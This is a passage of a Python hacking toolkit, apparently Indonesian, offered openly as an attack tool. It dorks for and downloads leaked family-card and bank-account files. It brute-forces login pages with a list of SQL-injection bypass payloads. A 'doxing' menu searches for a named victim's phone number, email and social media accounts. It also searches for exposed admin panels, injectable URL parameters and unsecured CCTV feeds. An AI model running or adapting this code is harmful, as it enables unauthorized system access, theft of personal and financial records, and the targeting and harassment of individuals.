                  db1 = ["xls", "pdf", "csv", "kartu-keluarga.pdf", "kk.pdf", "kk.xls", "kk.xlsx", "kk.csv", "database/kk.pdf", "admin/data/kk.pdf", "kartukeluarga.pdf", "pdf/kk.pdf", "kk.csv", "kartukeluarga.csv", "admin/csv/kk.csv", "database/kk.csv", "admin/dataset/kk.csv", "csv/kk.csv", "kk.xls", "database/kk.xls", "admin/data/kk.xls", "xls/kk.xls"]
                  db2 = ["xls", "pdf", "csv", "rekening.pdf", "rekening.xls", "rekening.xlsx", "rekening.csv", "database/rekening.pdf", "admin/data/rekening.pdf", "rekening.pdf", "pdf/rekening.pdf", "rekening.csv", "rekening.xlsx", "admin/csv/rekening.csv", "database/rekening.csv", "admin/dataset/rekening.csv", "csv/rekening.csv", "rekening.xls", "database/rekening.xls", "admin/data/rekening.xls", "xls/rekening.xls"]
                  print("1. Kartu Keluarga")
                  print("2. Rekening")
                  dork = input("\nChoice : ")
                  numr =+ 1
    
                  requ = 0
                  counter = 0    
                  if dork.startswith("1"):
                      pass
                      for results in search(db1,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                           rand_user = random.choice(user_agents)
                           counter = counter + 1
                           print("<!>Found<!> : ", results, counter)
                           wget.download(results, out=results)
                           time.sleep(0.5) 
                           requ += 1       
                           if requ >= int(numr):
                               break       
                  elif dork.startswith("2"):
                      pass                 
                      for results in search(db2,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                           rand_user = random.choice(user_agents)
                           counter = counter + 1
                           print("<!>Found<!> : ", results, counter)
                           wget.download(results, out=results)
                           time.sleep(0.5)
                           requ += 1
                           if requ >= int(numr):
                               break        
        except urllib.error.HTTPError as e:
                       if e.code == 429:
                           print(fail + f' [429] Error, Try Again Later.')
                           
                           quit()    
                       
        print ("Done.")
        print ("\n\t\t\t\t\033[34mMrSanZz\033[0m")
        print ("\t\t\033[1;91mExit\n\n")
        exit()
                
elif answer.startswith("6"):
    pass
    time.sleep(0.5)
    print("""
        
     ▄▄▄· ·▄▄▄▄  • ▌ ▄ ·. ▪   ▐ ▄     ▄▄▄▄·  ▄· ▄▌ ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▄ .▄▄▄  
    ▐█ ▀█ ██▪ ██ ·██ ▐███▪██ •█▌▐█    ▐█ ▀█▪▐█▪██▌▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ▀▄.▀·▀▄ █·
    ▄█▀▀█ ▐█· ▐█▌▐█ ▌▐▌▐█·▐█·▐█▐▐▌    ▐█▀▀█▄▐█▌▐█▪ ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ 
    ▐█ ▪▐▌██. ██ ██ ██▌▐█▌▐█▌██▐█▌    ██▄▪▐█ ▐█▀·.▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌
     ▀  ▀ ▀▀▀▀▀• ▀▀  █▪▀▀▀▀▀▀▀▀ █▪    ·▀▀▀▀   ▀ • .▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀
    """)
    time.sleep(0.1)
    # URL halaman login
    login_url = input('\nLogin Page Target : ')
    while True:
        pass
        # Inisialisasi sesi HTTP

        login_success = False  # Inisialisasi status login
     
        # Loop melalui nickname dan password satu per satu
        nickname = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%"]
        password = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%"]
        for nck in nickname:
            for psw in password:
                try:
                    login_data = {
                        'username': nck,
                        'password': psw
                    }
                    session = requests.Session()
                    print(info + f"Bypassing With Username : {nck}")
                    print(info + f"Password : {psw}")
                    # Kirim permintaan GET untuk membuka halaman login dan mendapatkan cookie
                    response = session.get(login_url)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    # Temukan token CSRF jika diperlukan
                    csrf_token = soup.find('input', {'name': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else ''
 
                    # Tambahkan token CSRF ke data login
                    login_data['csrf_token'] = csrf_token

                    login_response = session.post(login_url, data=login_data)
                    resp = requests.get(login_response)

                     # Periksa apakah login berhasil dengan memeriksa status respons HTTP
                    if 'Dashboard' in resp.text:  # Ubah ini sesuai dengan URL yang menunjukkan login berhasil
                        print(success + f'Login Successfully With Name : {nck}')
                        print('Password : ', psw)
                        login_success = True

                    # Pengecekan akhir jika tidak ada yang berhasil login
                    else:
                        print(fail + f'Cant login to the website')    
                except requests.exceptions.InvalidURL:
                    print(success + f'Login Successfully With Name : {nck}')
                    print('Password : ', psw)
                    continue
elif answer.startswith("7"):
    pass
    pN = phonenumbers.parse(input("Phone Number : "))
    tZ = timezone.time_zones_for_number(pN)
    C = carrier.name_for_number(pN, 'id')
    R = geocoder.description_for_number(pN, 'id')
    print(tZ)
    print(C)
    print(R)
elif answer.startswith("8"):
    pass
    print("""\033[1;91m
                        ░░░░░░░░░░                     
                  ░░▒▓██████████████▓▒░░░              
              ░░▓███████████████████████▓▒░            
            ░▓█████████████████████████████▓░░         
          ░▓██████████████████████████████████░░       
       ░░▒█████████████████████████████████████▓░░     
       ░▒████████████████████████████████████████▒░    
       ▒██████████████████████████████████████████▒░   
      ░███████████████████████████████████████████▓    
      ▒███████████████████████████████████████████▓    
      ░███████████████████████████████████████████▒░   
      ░███████████████████████████████████████████░    
       ▒██████████████████████████████████████████░    
       ░█████████████████████████████████████████▒░    
       ░████████▓▓█░▒██████████████▓░▒▓▒█████████▒     
       ░█████░░░░▒▓░░▒░░▒█████████░░ ░▒░██░▒█████▒     
       ▒████▒░          ░▒██████▒▓░    ░██░░▓████▓░    
       ░████▒░         ░░▓██████▒░      ▓▒░░█████▒     
       ░▒████░░      ░░░███▒█░▓██▒░       ░▓█████░     
       ░▒█████▓▒░   ░░▓████░█░▒████▓░░░ ░▒███████▒     
       ░▒████████████████▒▒░█░░▓█████████████████░     
       ░░▒███████████████░  ░░░▒████████████████▒░     
         ░▒█████████████▓░ ░█▒░░▓██████████████▓░      
          ░▒████▒░███████░░░██░▒███████▒▒███▓▓▓░       
           ░██▓▓░░▓████████████████████▒░ ▒▓░░░░       
           ░▓█░ ░▒█████████████████████▒░ ▒▓░          
            ▒█   ░▓████████████████████░               
            ▒█    ▒████████████████▓██▓░               
            ░░    ░░██▓██▒██▓███▓▓█░▓█▓░               
                   ░██▒██▒▒█░███▓░█░▒█▒░               
                   ░██░▒█▒░▒░███▓░▓░▒█▒░               
                   ░██ ░░░  ░███▓░ ░░▓░                
                   ░██      ░▒█▓▓░  ░░░                
                    ▓█░     ░▒█░░░                     
                    ▒█░     ░▒█░                       
                    ░█░     ░▒▓░                       
                            ░░▓░                       
    """)
    print("""\033[1;33m
    ██████╗  ██████╗ ███████╗ ██████╗ ██╗  ██╗
    ██╔══██╗██╔═══██╗██╔════╝██╔═══██╗╚██╗██╔╝
    ██║  ██║██║   ██║█████╗  ██║   ██║ ╚███╔╝ 
    ██║  ██║██║   ██║██╔══╝  ██║   ██║ ██╔██╗ 
    ██████╔╝╚██████╔╝██║     ╚██████╔╝██╔╝ ██╗
    ╚═════╝  ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝
                   DOXING FOX
                     V 1.3
                   By: MrSanZz
      \033[1;94mNote : Dont Do For Illegal Purpose !!
    """)
    print("1. Doxing With Name, Telephone Num, Gmail")
    print("2. Doxing With Dorking")
    print("3. Doxing With Information From Site")
    print("4. Doxing With Youtube Channel's")
    print("5. Doxing With Facebook")
    print("6. Doxing With Instagram")
    print("7. Doxing With Twitter")
    print(f"8. {red}Bad Doxing{yellow}")
    print("9. Little Doxing")
    print(f"{blue}10. {red}RUPY Doxing [R U Panic Yet?]{blue}")
    print('')
    choice = input("Choice : ")
    
    if choice == "1":
        pass
        victim = input(f'\nName Somebody [Recommended To Use Full Name] : ')
        victim_numbers = input(f'\nPhone Number Target : ')
        victim_gmail = input(f'\nGmail Target [Its ok to skip] : ')
        dork = ['intext:', 'inurl:', 'index.php?id= intext:', 'intitle:', 'index.php?id intitle:', 'allintext:', 'allinurl:', 'allintitle:', 'inurl:user=']
        hehe = [f'{victim}, {victim_numbers}, {victim_gmail}']
    
        for doxing in hehe:
            try:
                for lsv in dork:
                    counter = 1
                    counter = counter + 1
                    file_exists = ('.google-cookie')
                    if file_exists == True:
                        os.remove(file_exists)
                    rand_user = random.choice(user_agents)
                    print(info + f'[ + ] Process [ + ] Looking for : ', victim)
                    for results in search(f'{lsv} {doxing}', tld='com', num=2, start=0, stop=None, pause=2):
                        print(success + f'Success : ')
                        print(results)
                    else:
                        print(fail + f'Failed Finding. PLease Wait')
            except urllib.error.HTTPError as e:
                 if e.code == 404:
                     print(fail + f' [404] Download Fail, Skipping')
                     continue
                 if e.code == 403:
                     print(fail + f' [403] Download Fail, Skipping')
                     continue
                 if e.code == 429:
                     print(fail + f' [429] Fail, Please Wait.')
                     time.sleep(5)
    elif choice.startswith("2"):
        pass
        print(info + f'How To Write Name : Muhammad Sumbul To MuhammadSumbul')
        target = input(f'\n\033[1;94mName Target [Recommended To User Full Name] : ')
        dork = ['intext :', 'inurl :', 'index.php?id= intext :', 'intitle :', 'index.php?id intitle :', 'allintext :', 'allinurl :', 'allintitle :', 'inurl:user=']
        
        requsts = 1
        requsts = requsts + 1
        
        for dor in dork:
            try:
                rand_user = random.choice(user_agents)
                file_exists = ('.google-cookie')
                if file_exists == True:
                    os.remove('.google-cookie')
                print(f'\033[1;94m[ + ]Scanning {target} With Dork {dor}[ + ]')
                for results in search(f'{dor} {target}', tld='com', num=2, start=0, stop=None, pause=2):
                    print(success + f'Found ! ', results)
                else:
                    print(info + f'Not Found. Please Wait...')
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
    elif choice.startswith("3"):
        pass
        print(info + f'How To Write Name : Muhammad Sumbul To MuhammadSumbul')
        victm = input(f'\nName Target [Recommended To Use Full Name] : ')
        victm_addrs = input(f'\nTarget Address[Skip If U Dont Know] : ')
        victm_mails = input(f'\nGmail Target : ')
        print("Please Wait While Processing..")
        
        sites = (f'https://thatsthem.com/name/{victm}/{victm_addrs}')
        sites2 = (f'https://thatsthem.com/email/{victm_mails}')
        print(f'Try To Get Here:')
        print(sites)
        print(sites2)
        exit()
    elif choice.startswith("4"):
        pass
        to_find = ['www.facebook.com', 'www.tiktok.com', 'www.twitter.com', 'www.instagram.com', 'sociabuzz.com']
        dorks = ['intext : ', 'inurl : ', 'intitle : ']
        yt_chnls = input(f'\nYoutube Channels [Use https://]: ')
        for tof in to_find:
            pass
            for e in dorks:
                pass
                for page in search(f'site:{yt_chnls} {e}{tof}', tld='com',num=1, start=0, stop=None, pause=2):
                    print(f'Page Found : {tof}')
                    print(page)
    elif choice.startswith("5"):
        pass
        print(info + f'How To Write Name : Muhammad Sumbul To MuhammadSumbul')
        fb1 = input(f'\nName Target [Recommended To Use Full Name] : ')
        dorker = ['inurl:', 'intext:', 'intitle:']
        for y in dorker:
            pass
            for path in search(f'site:www.facebook.com {y}{fb1}', tld='com', num=1, start=0, stop=None, pause=2):
                print(f'Found :')
                print(path)
            else:
                print(fail + f'Cant Find {fb1}')
    elif choice.startswith("6"):
        pass
        print(info + f'How To Write Name : Muhammad Sumbul To MuhammadSumbul')
        fb2 = input(f'\nName Target [Recommended To Use Full Name] : ')
        dorker = ['inurl:', 'intext:', 'intitle:']
        for y in dorker:
            pass
            for path in search(f'site:www.instagram.com {y}{fb2}', tld='com', num=1, start=0, stop=None, pause=2):
                print(f'Found :')
                print(path)
            else:
                print(fail + f'Cant Find {fb2}')
    elif choice.startswith("7"):
        pass
        print(info + f'How To Write Name : Muhammad Sumbul To MuhammadSumbul')
        fb3 = input(f'\nName Target [Recommended To Use Full Name] : ')
        dorker = ['inurl:', 'intext:', 'intitle:']
        for y in dorker:
            pass
            for path in search(f'site:www.twitter.com {y}{fb3}', tld='com', num=1, start=0, stop=None, pause=2):
                print(f'Found :')
                print(path)
            else:
                print(fail + f'Cant Find {fb3}')
    elif choice.startswith("8"):
        pass
        print(f"{yellow}How To Write Name : Muhammad Sumbul To MuhammadSumbul, So There No Space!")
        flol = input(f"Target Name : ")
        print("Please Wait...")
        e = [f'https://9gag.com/u/{flol}', f'https://{flol}.blogspot.com', f'https://www.linkedin.com/in/{flol}', f'https://about.me/{flol}']
        for res in e:
            response = requests.get(res)
            keyword = flol
            if response.status_code == 200:
                if re.search(keyword, response.text, re.IGNORECASE):
                    print(success + f"\033[1;34mFound")
                    print(res)
                else:
                    print(fail + f"Not Found")
            else:
                print(f'Name {flol} Not Exists On {res}')
        time.sleep(1.2)
        for tes in search(f'intext:{flol}', num=1, pause=2, start=0, stop=None):
            print(f"{yellow}Find : ")
            print(tes)
    elif choice.startswith("9"):
        print("A Little Doxing")
        victims = input(f"Target Full Name : ")
        try:
            print("Wait.. Searching Info..")
            for results in search(f"intext:{victims}", tld='com', num=4, start=0, stop=None, pause=10):
                print(success + f"[ + ] Found! [ + ]")
                print(results)
                keywords = ['Location', 'Gmail', 'Email', 'PhoneNumbers', 'Phone', 'Number', 'Address', 'Data', 'ID', 'card']
                for uhh in keywords:
                    session = requests.session()
                    response = requests.get(results)
                    print(info + f" Checking For Columns Name {uhh}")
                    if re.search(uhh, response.text, re.IGNORECASE):
                        print(f"Columns {uhh} Exists !")
            print(info + f"[ + ] Little Doxing Done.. [ + ]")
        except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
    elif choice == "10":
        if os.name == "posix":
            os.system('clear')
        if os.name == "nt":
            os.system('cls')
        print(f"""{white}
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣲⣶⠒⠷⠶⠤⠴⠦⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⠚⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢌⣛⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠠⢚⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⡄⠙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀       ⠀⢀⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣀⠀⣀⣤⣧⠔⠛⠓⠲⠤⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣄⣠⣤⣴⣾⣿⣿⣾⡗⠀⢀⣀⢤⠐⠠⠤⣉⠓⠦⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠶⠶⢾⣿⡿⠛⢻⣻⠛⢻⣿⣿⠟⣋⣺⣿⠏⠀⠴⠿⠹⠋⠀⠀⠀⠀⠈⠀⠨⠳⣄⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠤⠄⠐⢾⣿⣝⠤⣀⢀⡠⣱⣿⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀
⠀⠀⠀⠀⠀        ⠀⢠⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⣛⣺⣿⣾⣛⣽⣿⡟⠁⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀
⠀⠀⠀⠀        ⠀⠐⡟⠀⠀⠀⠀⡠⠖⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⡈⠉⢉⡽⠿⢛⡿⢛⠯⠭⣒⣚⣩⣭⣭⣤⡤⠭⠭⢭⣥⣀⣉⣑⣒⢵⡀⠀⠀⢸⡇
⠀⠀⠀⠀        ⠀⣰⠃⠀⢀⡔⠋⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⣠⣤⡴⠋⠀⠀⠀⠀⠀⠾⢶⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠳⡀⠀⣸⠃
⠀⠀⠀        ⠀⢰⠟⢀⣴⠏⠀⡀⢀⣴⡿⠋⠀⠀⠀⢀⡴⠟⠋⠁⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⠔⠁⠀
⠀⠀⠀        ⠀⣞⣴⣿⠃⢠⣾⣴⣿⠋⠀⠀⠀⠀⠐⠋⠀⠀⠀⠀⠀⢐⣚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀
⠀⠀        ⠀⣸⣿⣿⣧⣶⣿⣿⣿⠗⠁⠀⡠⠂⠀⢀⠀⠀⠀⠀⠂⢉⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⡟⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⢀⠼⢻⣿⣿⣿⣿⣿⣿⠁⢀⣴⠏⢀⣠⠞⠁⢀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⣠⣿⣿⣿⣿⣿⣿⣧⣾⡿⣡⣾⣿⠃⣠⡾⠁⠀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠂⠀⢻⣍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠈⣽⣿⣿⣿⣿⣿⣿⡟⠉⣰⣿⡿⣡⣾⣿⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢻⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⣠⣿⣿⣿⣿⣿⣿⣿⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣱⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⢸⣾⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠐⠛⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢫⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⡄⠀⣿⣿⡏⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣴⡿⢋⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⠁⠀⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀       ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⢿⡿⠁⣿⠏⠘⢿⣿⣿⣿⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⠀⠿⠋⣿⡿⠋⣸⠟⠁⠀⣾⣿⣿⣿⣿⣿⠟⠁⠈⠀⠀⠹⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠁⠀⠀⠉⠀⠀⠰⠿⣿⣿⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠙⡏⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        """)
        target = input(f"Target Full Name : ")
        dork = ['inlink:', 'in:', 'on:', 'intext:', 'ontitle:']
        for i in dork:
            try:
                rand_user = random.choice(user_agents)
                cookie = exists('.google-cookie')
                if cookie == True:
                    os.remove('.google-cookie')
                print(red + f"[ + ] Searching {target} With {i} [ + ]")
                for doxed in search(f'{i}{target}', num=2, start=0, stop=None, pause=3):
                    print(success + f"Results:")
                    print(yellow + f"{doxed}")
            except KeyboardInterrupt:
                print("Interrupt")
                exit()
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(yellow + f"Wh00pz ! 429 E.. Exiting..")
                    exit()
elif answer.startswith("9"):
    pass
    print("1. Dork Admin")
    print("2. Basic Dorking")
    choiche = input(f'choice : ')
    
    if choiche.startswith("1"):
        pass
        site = input(f'site [example : in (india)]: ')
        requ = 1
        requ = requ + 1
        dork_adm = ['inurl  : admin.php', 'inurl : admin/dashboard.php', 'inurl : cp.php', 'inurl : admin/cp.php', 'inurl : admin/controlpanel.php', 'inurl : admin/cpanel.php', 'inurl : admin.html', 'inurl : admin/dashboard.html', 'inurl : admin/cp.html', 'inurl : admin/cpanel.html', 'inurl : admin/controlpanel.html', 'inurl: admin/dashboard', 'inurl : admin/login.php', 'inurl : administrator.php', 'inurl : administrator.html', 'inurl : admin/login', 'inurl : wp-admin', 'inurl : wp-login.php', 'inurl : admin/dashboardd', 'intext : Welcome To Dashboard', 'intext : admin', 'intext : control.php', 'intext : controlpanel', 'intext : edit_files']
        for dorking in dork_adm:
            try:
                for admin in search(f'site :{site} \t {dorking}', tld='com', num=1, start=0, stop=None, pause=2):
                    print(success + f'Results : ')
                    print(admin)
                else:
                    print(info + f'Finding ...')
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
    elif choiche.startswith("2"):
        pass
        site = input(f'site [example : in (india)]: ')
        requ = 1
        requ = requ + 1
        dork_basc = ['about.php?cartID=', 'accinfo.php?cartId=', 'acclogin.php?cartID=', 'add.php?bookid=', 'add_cart.php?num=', 'addcart.php?', 'addItem.php', 'add-to-cart.php?ID=', 'addToCart.php?idProduct=', 'addtomylist.php?ProdId=', 'adminEditProductFields.php?intProdID=', 'advSearch_h.php?idCategory=', 'affiliate.php?ID=', 'affiliate-agreement.cfm?storeid=', 'cart_additem.php?id=', 'cartadd.php?id=', 'catalog_main.php?catid=', 'customerService.php?****ID1=', 'display_item.php?id=', 'news.php?id=', 'productDetails.php?idProduct=', 'Select_Item.php?id=', 'productsByCategory.php?intCatalogID=', 'prodView.php?idProduct=', 'productDetails.php?idProduct=']
        for dorking2 in dork_basc:
            try:
                for reslut in search(f'site :{site} \t {dorking2}', tld='com', num=1, start=0, stop=None, pause=2):
                    print(success + f'Results : ')
                    print(reslut)
                else:
                    print(info + f'Finding ...')
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
                    
elif answer == ("10"):
    pass
    print("""\033[1;91m
       ____ ____ _______     __  _   _ _  _            _            _ 
      / ___/ ___|_   _\ \   / / | | | (_)(_) __ _  ___| | _____  __| |
     | |  | |     | |  \ \ / /  | |_| | || |/ _` |/ __| |/ / _ \/ _` |
     | |__| |___  | |   \ V /   |  _  | || | (_| | (__|   <  __/ (_| |
      \____\____| |_|    \_/    |_| |_|_|/ |\__,_|\___|_|\_\___|\__,_|
                                       |__/                           
    """)
    lokasi = input(f'\n\033[1;34mLokasi [Location] / Daerah :')
    dork = ['inurl ', 'intext ', 'intitle ', 'cgi ', 'view.shtml']
    dorkc = ['/view.shtml', 'cctv', 'CgiStart?page=', 'liveapplet', 'Webcam.html', 'EvoCam', 'view/view.shtml', 'cctv/view.shtml', 'cctv/index.shtml', 'cctv/index.php', 'cctv/index.html']
    
    for cctv in dork:
        try:
            rand_user = random.choice(user_agents)
            rand_ipv4 = random.choice(address)
            rand_ipv6 = random.choice(ip6)    
            print(info + f'Searching CCTV...')    
            for hijacked in search(f'{cctv}cctv {cctv}{lokasi}', tld='com', num=1, start=1, stop=None, pause=4):
                print(success + f'Found : ')
                print(hijacked)
            else:
                print(fail + f'Cant find')
        except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(fail + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
    print('CCTV Hijacker Done..')                
elif answer == ("11"):
    pass
    print("1. Brainly")
    print("2. Basic [Google]")
    
    jawaban = input("Select : ")
    
    if jawaban.startswith("1"):
        try:
            tugas = input(f'\nHomeWork Example[1 + 1 = ?] : ')
            dork = ['intext : ', 'inurl : ', 'intitle : ']
        
            for jawabans in dork:
                file_exists = ('.google-cookie')
                if file_exists == True:
                    os.remove(file_exists)
                print("Looking For Answer For Your Homework, Please Wait..")
                for searchingres in search(f'site : www.brainly.com {jawabans}{tugas}', tld='com', num=1, start=0, pause=2):
                    print("FOUND")
                    print(searchingres)
                else:
                    print("Still Finding.. Please Wait")   
        except KeyboardInterrupt:
            print("Interrupt Detected. Exiting")
            exit()
    elif jawaban.startswith("2"):
        try:
            tugas = input(f'\nHomeWork : ')
